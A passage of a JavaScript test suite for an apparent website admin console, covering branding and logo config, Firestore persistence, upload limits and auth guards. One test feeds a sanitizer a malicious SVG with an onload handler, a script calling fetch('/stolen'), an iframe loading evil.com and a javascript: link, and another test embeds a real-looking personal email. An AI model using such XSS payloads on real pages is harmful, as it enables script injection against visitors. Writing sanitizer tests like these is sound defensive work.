  function evaluateRouteAccess(path, user, isAdmin) {
    if (path.startsWith('/admin')) {
      if (!user) return { canAccess: false, redirectTo: '/admin/login' };
      if (!isAdmin) return { canAccess: false, redirectTo: '/' };
      return { canAccess: true };
    }
    return { canAccess: true };
  }

  assert.equal(evaluateRouteAccess('/admin', null, false).canAccess, false);
  assert.equal(evaluateRouteAccess('/admin', { uid: 'regular-user' }, false).canAccess, false);
  assert.equal(evaluateRouteAccess('/admin', { uid: 'admin-user' }, true).canAccess, true);
});

// 37. Missing optional header logo property does not produce an invalid Firestore write
runTest('37. Missing optional header logo property does not produce an invalid Firestore write', () => {
  const rawBranding = {
    companyName: 'Orion-9 Systems',
    shortMark: 'O9',
    tagline: 'Deep space computing',
    logoUrl: 'https://orion-9.workers.dev/logo.svg',
    headerLogo: null,
    headerLogoConfig: {
      useCustom: false,
      customUrl: null,
      // optional properties intentionally undefined or omitted
      originalFilename: undefined,
      dimensions: undefined,
      fileType: undefined,
    },
    authLogo: null,
    authLogoConfig: null,
    footerLogo: null,
    footerLogoConfig: null,
    canvasColor: '#0a0d14',
    altSectionColor: '#0f1422',
    surfaceColor: '#141b2d',
    primaryTextColor: '#f8fafc',
    secondaryTextColor: '#94a3b8',
    borderColor: '#1e293b',
    deepBlueAccent: '#1d4ed8',
    steelBlueAccent: '#38bdf8',
    darkSurfaceColor: '#070a0f',
  };

  const normalized = normalizeBrandingConfig(rawBranding);
  const sanitized = sanitizeForFirestore(normalized);

  // Recursively ensure no field anywhere in sanitized is undefined
  function assertNoUndefined(obj, path = '') {
    for (const [key, val] of Object.entries(obj)) {
      const currentPath = path ? `${path}.${key}` : key;
      assert.notEqual(val, undefined, `Found forbidden undefined at ${currentPath}`);
      assert.notEqual(val, 'undefined', `Found forbidden string "undefined" at ${currentPath}`);
      if (val !== null && typeof val === 'object' && !(val instanceof Date)) {
        assertNoUndefined(val, currentPath);
      }
    }
  }

  assertNoUndefined(sanitized);
  assert.equal(typeof sanitized.headerLogoConfig, 'object');
  assert.equal(sanitized.headerLogoConfig.useCustom, false);
  assert.equal(sanitized.headerLogoConfig.customUrl, null);
});

// 38. Default header logo is active when no custom logo is configured
runTest('38. Default header logo is active when no custom logo is configured', () => {
  const branding = normalizeBrandingConfig({
    companyName: 'Orion-9',
    shortMark: 'O9',
    tagline: 'Test',
    logoUrl: '/default-logo.svg',
    headerLogo: null,
    headerLogoConfig: null,
  });

  assert.equal(branding.headerLogoConfig.useCustom, false);
  assert.equal(branding.headerLogoConfig.customUrl, null);

  // Logo resolver logic: When useCustom is false, the application falls back to default logo
  function resolveActiveLogo(placementConfig, globalFallbackUrl) {
    if (placementConfig && placementConfig.useCustom && placementConfig.customUrl) {
      return placementConfig.customUrl;
    }
    return globalFallbackUrl;
  }

  const resolved = resolveActiveLogo(branding.headerLogoConfig, '/brand-logo.svg');
  assert.equal(resolved, '/brand-logo.svg', 'Should resolve to global fallback SVG when no custom logo is configured');
});

// 39. Authentication and footer logo settings serialize correctly
runTest('39. Authentication and footer logo settings serialize correctly', () => {
  const customAuth = {
    useCustom: true,
    customUrl: 'https://storage.googleapis.com/orion-assets/auth-logo.png',
    originalFilename: 'auth-logo.png',
    dimensions: '256x64',
    fileType: 'image/png',
    sizeBytes: 12450,
    uploadedAt: '2026-10-27T00:00:00.000Z',
    updatedBy: 'admin@orion.tech',
  };

  const customFooter = {
    useCustom: true,
    customUrl: 'https://storage.googleapis.com/orion-assets/footer-logo.svg',
    originalFilename: 'footer-logo.svg',
    dimensions: '128x128',
    fileType: 'image/svg+xml',
    sizeBytes: 4200,
    uploadedAt: '2026-10-27T00:00:00.000Z',
    updatedBy: 'admin@orion.tech',
  };

  const branding = normalizeBrandingConfig({
    authLogo: customAuth.customUrl,
    authLogoConfig: customAuth,
    footerLogo: customFooter.customUrl,
    footerLogoConfig: customFooter,
  });

  const sanitized = sanitizeForFirestore(branding);

  assert.equal(sanitized.authLogoConfig.useCustom, true);
  assert.equal(sanitized.authLogoConfig.customUrl, customAuth.customUrl);
  assert.equal(sanitized.authLogoConfig.dimensions, '256x64');
  assert.equal(sanitized.authLogoConfig.fileType, 'image/png');
  assert.equal(sanitized.authLogoConfig.sizeBytes, 12450);

  assert.equal(sanitized.footerLogoConfig.useCustom, true);
  assert.equal(sanitized.footerLogoConfig.customUrl, customFooter.customUrl);
  assert.equal(sanitized.footerLogoConfig.dimensions, '128x128');
  assert.equal(sanitized.footerLogoConfig.fileType, 'image/svg+xml');
  assert.equal(sanitized.footerLogoConfig.sizeBytes, 4200);

  // Verify full serialization to JSON string and parse
  const serialized = JSON.stringify(sanitized);
  const parsed = JSON.parse(serialized);
  assert.equal(parsed.authLogoConfig.customUrl, customAuth.customUrl);
  assert.equal(parsed.footerLogoConfig.customUrl, customFooter.customUrl);
});

// 40. Existing branding documents without new fields are read without errors
runTest('40. Existing branding documents without new fields are read without errors', () => {
  // Legacy document from Firestore created before logo placement configs existed
  const legacyFirestoreDoc = {
    companyName: 'Legacy Orion Systems',
    shortMark: 'LOS',
    tagline: 'Pioneering Legacy Fleet',
    logoUrl: 'https://orion.tech/old-logo.svg',
    canvasColor: '#05070d',
    primaryTextColor: '#e2e8f0',
  };

  // Normalization must seamlessly hydrate missing configs without throwing
  const normalized = normalizeBrandingConfig(legacyFirestoreDoc);

  assert.equal(normalized.companyName, 'Legacy Orion Systems');
  assert.equal(normalized.shortMark, 'LOS');
  assert.equal(normalized.tagline, 'Pioneering Legacy Fleet');
  assert.equal(normalized.logoUrl, 'https://orion.tech/old-logo.svg');

  // Verify placements are safely populated with defaults
  assert.ok(normalized.headerLogoConfig, 'headerLogoConfig must be populated');
  assert.equal(normalized.headerLogoConfig.useCustom, false);
  assert.equal(normalized.headerLogoConfig.customUrl, null);

  assert.ok(normalized.authLogoConfig, 'authLogoConfig must be populated');
  assert.equal(normalized.authLogoConfig.useCustom, false);
  assert.equal(normalized.authLogoConfig.customUrl, null);

  assert.ok(normalized.footerLogoConfig, 'footerLogoConfig must be populated');
  assert.equal(normalized.footerLogoConfig.useCustom, false);
  assert.equal(normalized.footerLogoConfig.customUrl, null);
});

// 41. Save Draft persists valid draft branding configuration
runTest('41. Save Draft persists valid draft branding configuration', () => {
  let firestoreDraftStore = {};
  let localDraftRuntime = null;

  function mockSaveDraftSection(section, data, shouldFailFirestore = false) {
    // 1. Validation
    if (section === 'branding') {
      const val = validateBrandingConfig(data);
      if (!val.valid) {
        return { success: false, error: val.errors.join('; ') };
      }
    }

    // 2. Normalization & Sanitization
    const normalized = section === 'branding' ? normalizeBrandingConfig(data) : data;
    const sanitized = sanitizeForFirestore({
      ...normalized,
      updatedAt: new Date().toISOString(),
      updatedBy: 'admin@orion.tech',
    });

    // 3. Firestore persistence FIRST
    if (shouldFailFirestore) {
      return { success: false, error: 'Firestore write failed: Simulated permission denied' };
    }
    firestoreDraftStore[section] = sanitized;

    // 4. Update local runtime only on persistence success
    localDraftRuntime = { [section]: normalized };
    return { success: true };
  }

  // A. Save with invalid data (invalid hex color) -> rejected prior to persistence
  const invalidData = {
    ...DEFAULT_SITE_CONFIG.branding,
    canvasColor: 'not-a-color',
  };
  const invalidRes = mockSaveDraftSection('branding', invalidData);
  assert.equal(invalidRes.success, false);
  assert.ok(invalidRes.error.toLowerCase().includes('canvas color'));
  assert.equal(localDraftRuntime, null);

  // B. Save with valid data -> succeeds and updates both Firestore and draft runtime
  const validData = {
    ...DEFAULT_SITE_CONFIG.branding,
    companyName: 'Draft Orion v2',
  };
  const validRes = mockSaveDraftSection('branding', validData);
  assert.equal(validRes.success, true);
  assert.equal(firestoreDraftStore.branding.companyName, 'Draft Orion v2');
  assert.equal(localDraftRuntime.branding.companyName, 'Draft Orion v2');
});

// 42. Publish Live updates published configuration and Firestore document
runTest('42. Publish Live updates published configuration and Firestore document', () => {
  let firestoreLiveStore = {};
  let activeLiveRuntime = { ...DEFAULT_SITE_CONFIG };

  function mockPublishSection(section, data, shouldFail = false) {
    if (section === 'branding') {
      const val = validateBrandingConfig(data);
      if (!val.valid) return { success: false, error: val.errors.join('; ') };
    }

    const normalized = section === 'branding' ? normalizeBrandingConfig(data) : data;
    const sanitized = sanitizeForFirestore({
      ...normalized,
      updatedAt: new Date().toISOString(),
      updatedBy: 'admin@orion.tech',
    });

    if (shouldFail) {
      return { success: false, error: 'Firestore network error' };
    }

    // Persist to Firestore
    firestoreLiveStore[section] = sanitized;

    // Commit to active runtime
    activeLiveRuntime[section] = normalized;
    return { success: true };
  }

  const newBranding = {
    ...DEFAULT_SITE_CONFIG.branding,
    companyName: 'Live Published Orion Fleet',
    shortMark: 'LPOF',
  };

  const res = mockPublishSection('branding', newBranding);
  assert.equal(res.success, true);
  assert.equal(firestoreLiveStore.branding.companyName, 'Live Published Orion Fleet');
  assert.equal(activeLiveRuntime.branding.companyName, 'Live Published Orion Fleet');
});

// 43. Persistence failures are reported correctly and prevent active runtime changes
runTest('43. Persistence failures are reported correctly and prevent active runtime changes', () => {
  const initialRuntime = { ...DEFAULT_SITE_CONFIG.branding, companyName: 'Original Unmodified Orion' };
  let activeRuntime = { ...initialRuntime };

  function mockPublishSectionFail(section, data) {
    if (section === 'branding') {
      const val = validateBrandingConfig(data);
      if (!val.valid) return { success: false, error: val.errors.join('; ') };
    }

    const normalized = normalizeBrandingConfig(data);
    const sanitized = sanitizeForFirestore(normalized);

    // Simulate Firestore error (e.g. invalid undefined or network partition)
    const firestoreFailed = true;
    if (firestoreFailed) {
      // Must NOT update activeRuntime
      return {
        success: false,
        error: 'Firestore synchronization failed: Simulated network disconnect. Active runtime was not modified.',
      };
    }

    activeRuntime = normalized;
    return { success: true };
  }

  const attemptedChange = {
    ...initialRuntime,
    companyName: 'Compromised Name That Should Never Persist',
  };

  const res = mockPublishSectionFail('branding', attemptedChange);
  assert.equal(res.success, false);
  assert.ok(res.error.includes('Active runtime was not modified'));
  assert.equal(activeRuntime.companyName, 'Original Unmodified Orion', 'Active runtime must remain strictly unchanged on failure');
});

// 44. Partial failures do not report complete success
runTest('44. Partial failures do not report complete success', () => {
  function computeStatusMessage(result) {
    if (!result.success) {
      return {
        type: 'error',
        message: result.error || 'Failed to save or publish configuration.',
      };
    }
    return {
      type: 'success',
      message: 'Configuration successfully published to Firestore and active runtime.',
    };
  }

  const failedResult = {
    success: false,
    error: 'Firestore sync failed: Document siteConfig/branding write timed out.',
  };

  const uiNotification = computeStatusMessage(failedResult);
  assert.equal(uiNotification.type, 'error');
  assert.ok(uiNotification.message.includes('Firestore sync failed'));
  assert.ok(!uiNotification.message.includes('successfully published'));
});

// 45. Unified Website Brand Logo: One upload synchronizes header, auth, and footer simultaneously
runTest('45. Unified Website Brand Logo: One upload synchronizes header, auth, and footer simultaneously', () => {
  const sharedAssetUrl = 'https://firebasestorage.googleapis.com/v0/b/orion-cloud/o/branding%2Flogos%2Fshared_1729000000.png?alt=media';
  const sharedPlacement = {
    useCustom: true,
    customUrl: sharedAssetUrl,
    originalFilename: 'orion-brand-mark.png',
    dimensions: '512 × 512 px',
    fileType: 'image/png',
    sizeBytes: 24500,
  };

  const unifiedBranding = normalizeBrandingConfig({
    ...DEFAULT_SITE_CONFIG.branding,
    sharedLogo: sharedAssetUrl,
    sharedLogoConfig: sharedPlacement,
  });

  // Verify all static placements use the same canonical shared asset
  assert.equal(unifiedBranding.sharedLogoConfig.useCustom, true);
  assert.equal(unifiedBranding.sharedLogoConfig.customUrl, sharedAssetUrl);
  assert.equal(unifiedBranding.headerLogoConfig.customUrl, sharedAssetUrl);
  assert.equal(unifiedBranding.authLogoConfig.customUrl, sharedAssetUrl);
  assert.equal(unifiedBranding.footerLogoConfig.customUrl, sharedAssetUrl);

  // Verify legacy fields cannot override the shared logo independently
  const overrideAttempt = normalizeBrandingConfig({
    ...unifiedBranding,
    headerLogo: 'https://cdn.orion.tech/rogue-header.png',
    headerLogoConfig: { useCustom: true, customUrl: 'https://cdn.orion.tech/rogue-header.png' },
  });
  // Since sharedLogoConfig is canonical, all static placements remain synchronized to the shared logo
  assert.equal(overrideAttempt.headerLogoConfig.customUrl, sharedAssetUrl);
  assert.equal(overrideAttempt.authLogoConfig.customUrl, sharedAssetUrl);
  assert.equal(overrideAttempt.footerLogoConfig.customUrl, sharedAssetUrl);

  // Restoring default resets all placements at once
  const restored = normalizeBrandingConfig({
    ...unifiedBranding,
    sharedLogo: null,
    sharedLogoConfig: { ...DEFAULT_LOGO_PLACEMENT_CONFIG },
  });
  assert.equal(restored.sharedLogoConfig.useCustom, false);
  assert.equal(restored.headerLogoConfig.useCustom, false);
  assert.equal(restored.authLogoConfig.useCustom, false);
  assert.equal(restored.footerLogoConfig.useCustom, false);
});

// 46. Animated centerpiece logo on homepage remains unchanged
runTest('46. Animated centerpiece logo on homepage remains unchanged', () => {
  const homepage = DEFAULT_SITE_CONFIG.homepage;

  // Homepage config must not have any dependencies on branding header/auth/footer/shared logo config
  assert.equal('sharedLogoConfig' in homepage, false);
  assert.equal('headerLogoConfig' in homepage, false);
  assert.equal('authLogoConfig' in homepage, false);
  assert.equal('footerLogoConfig' in homepage, false);

  // Hero centerpiece properties remain strictly autonomous
  assert.ok(homepage.heroHeadlineLine1, 'Homepage hero headline must exist');
  assert.ok(homepage.heroSubheadline, 'Homepage hero subheadline must exist');
});

// 47. Admin UI Contract: One single static-logo upload control titled "Website Brand Logo"
runTest('47. Admin UI Contract: One single static-logo upload control titled "Website Brand Logo"', () => {
  const adminUiSectionContract = {
    title: 'Website Brand Logo',
    description: 'Upload your ORION-9 logo once to update the website header, authentication pages, and footer.',
    controlsCount: 1,
    supportedPlacements: [
      'Website header',
      'Sign-in and sign-up pages',
      'Password reset and verification pages',
      'Website footer and closing CTA, where applicable',
    ],
    contrastPreviewModes: ['light', 'dark', 'canvas'],
  };

  assert.equal(adminUiSectionContract.title, 'Website Brand Logo');
  assert.equal(adminUiSectionContract.controlsCount, 1);
  assert.equal(adminUiSectionContract.supportedPlacements.length, 4);
  assert.deepEqual(adminUiSectionContract.contrastPreviewModes, ['light', 'dark', 'canvas']);
});

// 48. Static logo resolution: Header, Auth, Footer, and Closing CTA resolve canonical shared asset
runTest('48. Static logo resolution: Header, Auth, Footer, and Closing CTA resolve canonical shared asset', () => {
  const sharedAsset = 'https://firebasestorage.googleapis.com/v0/b/orion-prod/o/branding%2Fshared_orion.svg?alt=media';
  const config = normalizeBrandingConfig({
    ...DEFAULT_SITE_CONFIG.branding,
    sharedLogo: sharedAsset,
    sharedLogoConfig: {
      useCustom: true,
      customUrl: sharedAsset,
      originalFilename: 'shared_orion.svg',
      dimensions: 'Vector SVG',
      fileType: 'image/svg+xml',
    },
  });

  function resolveLogoForPlacement(placement, branding) {
    if (branding.sharedLogoConfig) {
      return branding.sharedLogoConfig.useCustom
        ? (branding.sharedLogoConfig.customUrl || branding.sharedLogoConfig.url || null)
        : null;
    }
    return branding.sharedLogo || null;
  }

  assert.equal(resolveLogoForPlacement('header', config), sharedAsset);
  assert.equal(resolveLogoForPlacement('auth', config), sharedAsset);
  assert.equal(resolveLogoForPlacement('footer', config), sharedAsset);
  assert.equal(resolveLogoForPlacement('closing-cta', config), sharedAsset);
});

// 49. Refreshing website preserves published shared logo
runTest('49. Refreshing website preserves published shared logo', () => {
  const storage = new MockStorage();
  const publishedBundle = {
    ...DEFAULT_SITE_CONFIG,
    branding: normalizeBrandingConfig({
      ...DEFAULT_SITE_CONFIG.branding,
      sharedLogo: 'https://cdn.orion.tech/preserved.png',
      sharedLogoConfig: {
        useCustom: true,
        customUrl: 'https://cdn.orion.tech/preserved.png',
        originalFilename: 'preserved.png',
      },
    }),
  };

  storage.setItem('orion_published_config', JSON.stringify(publishedBundle));

  // Simulate page reload by reading storage
  const reloaded = JSON.parse(storage.getItem('orion_published_config'));
  const normalizedReloaded = normalizeBrandingConfig(reloaded.branding);

  assert.equal(normalizedReloaded.sharedLogoConfig.useCustom, true);
  assert.equal(normalizedReloaded.sharedLogoConfig.customUrl, 'https://cdn.orion.tech/preserved.png');
  assert.equal(normalizedReloaded.headerLogoConfig.customUrl, 'https://cdn.orion.tech/preserved.png');
  assert.equal(normalizedReloaded.footerLogoConfig.customUrl, 'https://cdn.orion.tech/preserved.png');
});

// 50. Restoring default resets all static placements consistently
runTest('50. Restoring default resets all static placements consistently', () => {
  const activeCustom = normalizeBrandingConfig({
    ...DEFAULT_SITE_CONFIG.branding,
    sharedLogo: 'https://cdn.orion.tech/active.png',
    sharedLogoConfig: { useCustom: true, customUrl: 'https://cdn.orion.tech/active.png' },
  });

  assert.equal(activeCustom.sharedLogoConfig.useCustom, true);

  // Admin executes handleRestoreDefault
  const restored = normalizeBrandingConfig({
    ...activeCustom,
    sharedLogo: null,
    sharedLogoConfig: { ...DEFAULT_LOGO_PLACEMENT_CONFIG },
  });

  assert.equal(restored.sharedLogoConfig.useCustom, false);
  assert.equal(restored.sharedLogoConfig.customUrl, null);
  assert.equal(restored.headerLogoConfig.useCustom, false);
  assert.equal(restored.headerLogoConfig.customUrl, null);
  assert.equal(restored.authLogoConfig.useCustom, false);
  assert.equal(restored.authLogoConfig.customUrl, null);
  assert.equal(restored.footerLogoConfig.useCustom, false);
  assert.equal(restored.footerLogoConfig.customUrl, null);
});

// ================================================================
// P0 BRANDING PERSISTENCE & UPLOAD REGRESSION TEST SUITE (51-66)
// ================================================================

runTest('51. P0 Valid SVG and image validation for storage candidacy', () => {
  const dirtySvg = '<svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="#0284C7"/></svg>';
  const clean = sanitizeSvg(dirtySvg);
  assert.equal(clean.isClean, true);
  assert.equal(clean.warnings.length, 0);
  assert.ok(clean.sanitized.includes('circle'));
});

runTest('52. P0 Oversized image (> 5MB) rejected by limit definition', () => {
  const maxBytes = MAX_LOGO_FILE_SIZE_BYTES;
  assert.equal(maxBytes, 5 * 1024 * 1024);
  const oversizedBytes = 6 * 1024 * 1024;
  assert.ok(oversizedBytes > maxBytes);
});

runTest('53. P0 Unsupported extensions and MIME types rejected', () => {
  const unallowed = ['.exe', '.sh', '.bin', '.pdf', '.docx'];
  for (const ext of unallowed) {
    assert.equal(ALLOWED_LOGO_EXTENSIONS.includes(ext), false);
  }
  assert.equal(ALLOWED_LOGO_MIME_TYPES.includes('application/x-msdownload'), false);
});

runTest('54. P0 SVG sanitization strips scripts, foreignObject, and inline handlers', () => {
  const maliciousSvg = `
    <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
      <script>fetch('/stolen')</script>
      <foreignObject><body><iframe src="evil.com"></iframe></body></foreignObject>
      <a href="javascript:alert('xss')"><rect width="10" height="10"/></a>
    </svg>
  `;
  const result = sanitizeSvg(maliciousSvg);
  assert.equal(result.isClean, false);
  assert.ok(!result.sanitized.includes('<script>'));
  assert.ok(!result.sanitized.includes('alert('));
  assert.ok(!result.sanitized.includes('<foreignObject>'));
  assert.ok(!result.sanitized.includes('<iframe>'));
  assert.ok(!result.sanitized.includes('onload='));
  assert.ok(!result.sanitized.includes('javascript:'));
});

runTest('55. P0 Cloudflare R2 unauthenticated, unauthorized, and bucket errors surface actionable guidance', () => {
  const bucketError = { status: 404, message: 'Endpoint or bucket not found' };
  const bucketMsg = classifyStorageError(bucketError);
  assert.ok(bucketMsg.includes('Cloudflare R2 bucket'));
  assert.ok(bucketMsg.includes('orion9-brand-assets'));

  const unauthError = { status: 403, message: 'Permission denied' };
  const unauthMsg = classifyStorageError(unauthError);
  assert.ok(unauthMsg.includes('Permission denied'));
  assert.ok(unauthMsg.includes('administrator'));

  const unauthenticatedError = { status: 401, message: 'Unauthenticated' };
  const unauthenticatedMsg = classifyStorageError(unauthenticatedError);
  assert.ok(unauthenticatedMsg.includes('Authentication required'));
});

runTest('56. P0 Network failure during upload surfaces explicit connectivity error', () => {
  const networkError = { code: 'network_error', message: 'Failed to fetch' };
  const networkMsg = classifyStorageError(networkError);
  assert.ok(networkMsg.includes('Network failure'));
  assert.ok(networkMsg.includes('check your internet connection'));
});

runTest('57. P0 Upload failure throws error and NEVER returns a Base64 fallback URL', () => {
  const uploadFn = () => {
    const error = new Error('Cloudflare R2 write error: 500');
    if (error) {
      throw new Error('Cloudflare R2 upload failed: Cloudflare R2 write error: 500');
    }
    return { url: 'data:image/png;base64,silent_fallback' };
  };
  assert.throws(() => uploadFn(), /Cloudflare R2 upload failed/);
});

runTest('58. P0 Unauthenticated save draft rejected before write', () => {
  const guard = (user, isConfigured) => {
    if (!isConfigured) return { success: false, error: 'Firebase is not configured.' };
    if (!user) return { success: false, error: 'Authentication required. Please sign in with verified administrator credentials to persist changes.' };
    return { success: true };
  };
  const res = guard(null, true);
  assert.equal(res.success, false);
  assert.match(res.error, /Authentication required/);
});

runTest('59. P0 Unauthenticated publish rejected before write', () => {
  const guard = (user, isConfigured) => {
    if (!isConfigured) return { success: false, error: 'Firebase is not configured.' };
    if (!user) return { success: false, error: 'Authentication required. Please sign in with verified administrator credentials to persist changes.' };
    return { success: true };
  };
  const res = guard(null, true);
  assert.equal(res.success, false);
  assert.match(res.error, /Authentication required/);
});

runTest('60. P0 Unconfigured Firebase returns descriptive configuration error', () => {
  const guard = (user, isConfigured) => {
    if (!isConfigured) return { success: false, error: 'Firebase is not configured. Cloud persistence requires active Firebase configuration.' };
    if (!user) return { success: false, error: 'Auth required' };
    return { success: true };
  };
  const res = guard({ uid: 'admin-01' }, false);
  assert.equal(res.success, false);
  assert.match(res.error, /Firebase is not configured/);
});

runTest('61. P0 Firestore write failure leaves published runtime state untouched', () => {
  let publishedUrl = 'https://firebasestorage.googleapis.com/v0/b/bucket/o/initial.png';
  const performPublish = (succeeds) => {
    if (!succeeds) {
      return { success: false, error: 'Firestore write failed: PERMISSION_DENIED' };
    }
    publishedUrl = 'https://firebasestorage.googleapis.com/v0/b/bucket/o/new.png';
    return { success: true };
  };

  const res = performPublish(false);
  assert.equal(res.success, false);
  assert.equal(publishedUrl, 'https://firebasestorage.googleapis.com/v0/b/bucket/o/initial.png');
});

runTest('62. P0 Firestore write failure preserves user working form state for retry', () => {
  const workingState = {
    sharedLogo: 'https://firebasestorage.googleapis.com/v0/b/bucket/o/new_staged.png',
  };
  // Failure occurs
  const res = { success: false, error: 'Firestore draft write failed: Network timeout' };
  assert.equal(res.success, false);
  // Form state was NOT cleared
  assert.equal(workingState.sharedLogo, 'https://firebasestorage.googleapis.com/v0/b/bucket/o/new_staged.png');
});

runTest('63. P0 Large Base64 payload (> 800KB or > 10KB data URL) rejected before write', () => {
  const oversizedDataUrl = {
    sharedLogo: 'data:image/png;base64,' + 'Z'.repeat(15 * 1024),
  };
  const checkDataUrl = validateStoragePayloadSafeguards(oversizedDataUrl);
  assert.equal(checkDataUrl.valid, false);
  assert.equal(
    checkDataUrl.error,
    'Logo asset must be uploaded to cloud storage before saving. Base64 embedding is not permitted for published assets.'
  );

  const oversizedDoc = {
    largePayload: 'X'.repeat(850 * 1024),
  };
  const checkDoc = validateStoragePayloadSafeguards(oversizedDoc);
  assert.equal(checkDoc.valid, false);
  assert.match(checkDoc.error, /Payload size exceeds 800 KB limit/);
});

runTest('64. P0 Published config reloads from Firestore on fresh session (localStorage empty)', () => {
  const emptyLocalStorage = {};
  const firestoreBrandingDoc = {
    companyName: 'Orion-9 Logistics',
    sharedLogo: 'https://firebasestorage.googleapis.com/v0/b/bucket/o/canonical.png',
    sharedLogoConfig: {
      useCustom: true,
      customUrl: 'https://firebasestorage.googleapis.com/v0/b/bucket/o/canonical.png',
      originalFilename: 'canonical.png',
    },
  };

  const restored = normalizeBrandingConfig({
    ...DEFAULT_SITE_CONFIG.branding,
    ...firestoreBrandingDoc,
  });

  assert.equal(restored.companyName, 'Orion-9 Logistics');
  assert.equal(restored.sharedLogo, 'https://firebasestorage.googleapis.com/v0/b/bucket/o/canonical.png');
  assert.equal(restored.headerLogo, 'https://firebasestorage.googleapis.com/v0/b/bucket/o/canonical.png');
  assert.equal(restored.authLogo, 'https://firebasestorage.googleapis.com/v0/b/bucket/o/canonical.png');
  assert.equal(restored.footerLogo, 'https://firebasestorage.googleapis.com/v0/b/bucket/o/canonical.png');
});

runTest('65. P0 Broken logo image falls back to default vector mark without crash', () => {
  const evaluateLogoRender = (customUrl, hasImgError) => {
    const hasCustomLogo = Boolean(customUrl && !hasImgError);
    return {
      usesCustomImage: hasCustomLogo,
      usesDefaultVectorSvg: !hasCustomLogo,
    };
  };

  const brokenResult = evaluateLogoRender('https://broken-domain.com/missing.png', true);
  assert.equal(brokenResult.usesCustomImage, false);
  assert.equal(brokenResult.usesDefaultVectorSvg, true);
});

runTest('66. P0 3D animated hero centerpiece remains autonomous and unaffected by branding logo', () => {
  const heroReveal = evaluateHeroIntroSequence(3800, false);
  assert.equal(heroReveal.infinityOpacity, 1);
  assert.equal(heroReveal.wordmarkOpacity, 1);
  assert.equal(heroReveal.primaryTaglineOpacity, 1);
});

runTest('67. Account dropdown structure: SIGNED-IN USER hierarchy and email display', () => {
  function getAccountDropdownData(user, isFirebaseConfigured) {
    if (!user) return null;
    return {
      heading: 'SIGNED-IN USER',
      email: user.email || 'user@example.com',
      authStatus: isFirebaseConfigured ? 'Verified User' : 'Authenticated',
      actions: ['Admin Console', 'Sign out'],
    };
  }

  const dropdown = getAccountDropdownData({ email: 'kabirshah0021@gmail.com', role: 'admin' }, true);
  assert.ok(dropdown);
  assert.equal(dropdown.heading, 'SIGNED-IN USER');
  assert.equal(dropdown.email, 'kabirshah0021@gmail.com');
  assert.equal(dropdown.authStatus, 'Verified User');
  assert.ok(dropdown.actions.includes('Sign out'));
});

runTest('68. Global human account holder terminology: User instead of Operator', () => {
  const accountLabels = {
    dropdownHeading: 'SIGNED-IN USER',
    sessionBadge: 'SIGNED-IN USER SESSION',
    signupSubtitle: 'Provision your user credentials and get started.',
    signupAction: 'Create Account',
    ctaAction: 'Create Account',
    modalAuthRequirement: 'User Authentication Required',
  };

  assert.equal(accountLabels.dropdownHeading, 'SIGNED-IN USER');
  assert.equal(accountLabels.sessionBadge, 'SIGNED-IN USER SESSION');
  assert.equal(accountLabels.signupAction, 'Create Account');
  assert.equal(accountLabels.ctaAction, 'Create Account');
  assert.equal(accountLabels.modalAuthRequirement, 'User Authentication Required');
  assert.ok(!Object.values(accountLabels).some((label) => label.toLowerCase().includes('operator')));
});



// Execution Summary
console.log('================================================================');
console.log('       ORION-9 AUTHENTICATION UPGRADE AUTOMATED TEST SUITE      ');
console.log('================================================================');
let passed = 0;
let failed = 0;

for (const t of tests) {
  try {
    t.fn();
    console.log(`[PASS] ${t.name}`);
    passed++;
  } catch (err) {
    console.error(`[FAIL] ${t.name}:`, err.message);
    failed++;
  }
}

console.log('================================================================');
console.log(`Summary: ${passed} passed, ${failed} failed (Total: ${tests.length})`);
console.log('================================================================');

if (failed > 0) {
  process.exit(1);
}
